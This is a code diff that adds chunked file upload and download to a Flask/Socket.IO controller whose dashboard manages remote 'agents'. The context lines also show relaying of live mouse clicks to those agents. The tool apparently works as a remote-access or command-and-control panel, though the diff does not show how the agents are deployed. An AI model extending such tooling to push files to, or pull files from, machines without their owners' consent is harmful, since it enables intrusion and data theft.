@@ -15,7 +15,7 @@ app.config['SECRET_KEY'] = 'your_secret_key_here'  # Change this to a random sec
 socketio = SocketIO(app, async_mode='eventlet')
 
 # --- Web Dashboard HTML (with Socket.IO) ---
-DASHBOARD_HTML = '''
+DASHBOARD_HTML = r'''
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -456,6 +456,29 @@ DASHBOARD_HTML = '''
                             </select>
                         </div>
                     </div>
+
+                    <div class="control-group">
+                        <div class="control-header">File Transfer</div>
+                        <div class="input-group">
+                            <label class="input-label">Upload File to Agent</label>
+                            <input type="file" id="upload-file" class="neural-input">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Agent Destination Path (e.g., C:\Users\Public\file.txt)</label>
+                            <input type="text" id="agent-upload-path" class="neural-input" placeholder="Enter full path on agent...">
+                        </div>
+                        <button class="btn" onclick="uploadFile()">Upload</button>
+                        <div class="input-group" style="margin-top: 15px;">
+                            <label class="input-label">Download File from Agent</label>
+                            <input type="text" id="download-filename" class="neural-input" placeholder="Enter filename on agent...">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Save to Local Path (e.g., C:\Users\YourName\Downloads\file.txt)</label>
+                            <input type="text" id="local-download-path" class="neural-input" placeholder="Enter local path to save (e.g., C:\\Users\\YourName\\Downloads\\file.txt)">
+                        </div>
+                        <button class="btn" onclick="downloadFile()">Download</button>
+                        <div id="file-transfer-status" class="status-indicator"></div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -720,6 +743,140 @@ DASHBOARD_HTML = '''
             });
         });
 
+        // --- File Transfer (Chunked) ---
+        let fileChunks = {};
+
+        function uploadFile() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+            const fileInput = document.getElementById('upload-file');
+            const file = fileInput.files[0];
+
+            if (!file) {
+                showStatus('Please select a file to upload.', 'error');
+                return;
+            }
+
+            const CHUNK_SIZE = 1024 * 512; // 512KB
+            let offset = 0;
+
+            showStatus(`Starting upload of ${file.name}...`, 'success');
+            const reader = new FileReader();
+
+            function readSlice(o) {
+                const slice = file.slice(o, o + CHUNK_SIZE);
+                reader.readAsDataURL(slice);
+            }
+
+            reader.onload = function(e) {
+                const chunk = e.target.result;
+                const agentUploadPath = document.getElementById('agent-upload-path').value;
+                socket.emit('upload_file_chunk', {
+                    agent_id: selectedAgentId,
+                    filename: file.name,
+                    data: chunk,
+                    offset: offset,
+                    destination_path: agentUploadPath
+                });
+                
+                // Estimate offset for progress. Note: base64 is larger.
+                // A more accurate progress would require more complex calculations.
+                offset += CHUNK_SIZE; 
+                if (offset > file.size) offset = file.size;
+
+                showFileTransferProgress(file.name, offset, file.size, 'Uploading');
+
+                if (offset < file.size) {
+                    readSlice(offset);
+                } else {
+                    socket.emit('upload_file_end', {
+                        agent_id: selectedAgentId,
+                        filename: file.name
+                    });
+                    showStatus(`File ${file.name} upload complete.`, 'success');
+                }
+            };
+            readSlice(0);
+        }
+
+        function downloadFile() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+            const filename = document.getElementById('download-filename').value;
+            if (!filename) {
+                showStatus('Please enter a filename to download.', 'error');
+                return;
+            }
+            fileChunks[filename] = []; // Reset chunks
+            const localPath = document.getElementById('local-download-path').value;
+            socket.emit('download_file', {
+                agent_id: selectedAgentId,
+                filename: filename,
+                local_path: localPath
+            });
+            showStatus(`Requesting ${filename} from agent...`, 'success');
+        }
+
+        function showFileTransferProgress(filename, loaded, total, action) {
+            const progress = total > 0 ? Math.round((loaded / total) * 100) : 100;
+            const statusDiv = document.getElementById('file-transfer-status');
+            statusDiv.style.display = 'block';
+            statusDiv.className = 'status-indicator status-success';
+            statusDiv.textContent = `${action} ${filename}: ${progress}%`;
+             if (progress >= 100) {
+                setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
+            }
+        }
+
+        socket.on('file_download_chunk', (data) => {
+            if (data.agent_id !== selectedAgentId) return;
+
+            const { filename, chunk, offset, total_size, error } = data;
+
+            if (error) {
+                showStatus(`Error downloading ${filename}: ${error}`, 'error');
+                if(fileChunks[filename]) delete fileChunks[filename];
+                return;
+            }
+
+            if (!fileChunks[filename]) {
+                fileChunks[filename] = [];
+            }
+            
+            try {
+                const byteString = atob(chunk.split(',')[1]);
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                fileChunks[filename].push(ia);
+            } catch (e) {
+                showStatus(`Error processing chunk for ${filename}: ${e}`, 'error');
+                delete fileChunks[filename];
+                return;
+            }
+
+            const loaded = fileChunks[filename].reduce((acc, curr) => acc + curr.length, 0);
+            showFileTransferProgress(filename, loaded, total_size, 'Downloading');
+
+            if (loaded >= total_size) {
+                const blob = new Blob(fileChunks[filename], { type: 'application/octet-stream' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = filename;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                showStatus(`Downloaded ${filename}.`, 'success');
+                delete fileChunks[filename];
+            }
+        });
+
 
     </script>
 </body>
@@ -728,6 +885,7 @@ DASHBOARD_HTML = '''
 
 # In-memory storage for agent data
 AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
+DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})
 
 # --- Operator-facing endpoints ---
 
@@ -887,6 +1045,112 @@ def handle_live_mouse_click(data):
     if agent_sid:
         emit('mouse_click', data, room=agent_sid, include_self=False)
 
+# --- Chunked File Transfer Handlers ---
+@socketio.on('upload_file_chunk')
+def handle_upload_file_chunk(data):
+    agent_id = data.get('agent_id')
+    filename = data.get('filename')
+    chunk = data.get('data')
+    offset = data.get('offset')
+    destination_path = data.get('destination_path')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('file_chunk_from_operator', {
+            'filename': filename,
+            'data': chunk,
+            'offset': offset,
+            'destination_path': destination_path
+        }, room=agent_sid)
+
+@socketio.on('upload_file_end')
+def handle_upload_file_end(data):
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('file_upload_complete_from_operator', data, room=agent_sid)
+        print(f"Upload of {data.get('filename')} to {agent_id} complete.")
+
+@socketio.on('download_file')
+def handle_download_file(data):
+    agent_id = data.get('agent_id')
+    filename = data.get('filename')
+    local_path = data.get('local_path')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
+        DOWNLOAD_BUFFERS[filename]["local_path"] = local_path # Store local path
+        emit('request_file_chunk_from_agent', {'filename': filename}, room=agent_sid)
+    else:
+        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)
+
+@socketio.on('file_chunk_from_agent')
+def handle_file_chunk_from_agent(data):
+    agent_id = data.get('agent_id')
+    filename = data.get('filename')
+    chunk = data.get('chunk')
+    offset = data.get('offset')
+    total_size = data.get('total_size')
+    error = data.get('error')
+
+    if error:
+        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
+        if filename in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[filename]
+        return
+
+    if filename not in DOWNLOAD_BUFFERS:
+        DOWNLOAD_BUFFERS[filename] = {"chunks": [], "total_size": total_size, "local_path": None}
+
+    DOWNLOAD_BUFFERS[filename]["chunks"].append(base64.b64decode(chunk.split(',')[1]))
+    DOWNLOAD_BUFFERS[filename]["total_size"] = total_size # Update total size in case it was not set initially
+
+    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[filename]["chunks"])
+
+    # If all chunks received, save the file locally
+    if current_download_size >= total_size:
+        full_content = b"".join(DOWNLOAD_BUFFERS[filename]["chunks"])
+        local_path = DOWNLOAD_BUFFERS[filename]["local_path"]
+
+        if local_path:
+            try:
+                # Ensure directory exists
+                os.makedirs(os.path.dirname(local_path), exist_ok=True)
+                with open(local_path, 'wb') as f:
+                    f.write(full_content)
+                print(f"Successfully downloaded {filename} to {local_path}")
+                emit('file_download_chunk', {
+                    'agent_id': agent_id,
+                    'filename': filename,
+                    'chunk': chunk,
+                    'offset': offset,
+                    'total_size': total_size,
+                    'local_path': local_path # Pass local_path back to frontend
+                }, room='operators')
+            except Exception as e:
+                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
+                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
+        else:
+            # If no local_path was specified, send the chunks to the frontend for browser download
+            emit('file_download_chunk', {
+                'agent_id': agent_id,
+                'filename': filename,
+                'chunk': chunk,
+                'offset': offset,
+                'total_size': total_size
+            }, room='operators')
+        
+        del DOWNLOAD_BUFFERS[filename]
+    else:
+        # Continue sending chunks to frontend for progress update
+        emit('file_download_chunk', {
+            'agent_id': agent_id,
+            'filename': filename,
+            'chunk': chunk,
+            'offset': offset,
+            'total_size': total_size
+        }, room='operators')
+
+
+
 if __name__ == "__main__":
     print("Starting controller with Socket.IO support...")
-    socketio.run(app, host="0.0.0.0", port=8080, debug=False)
+    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), debug=False)
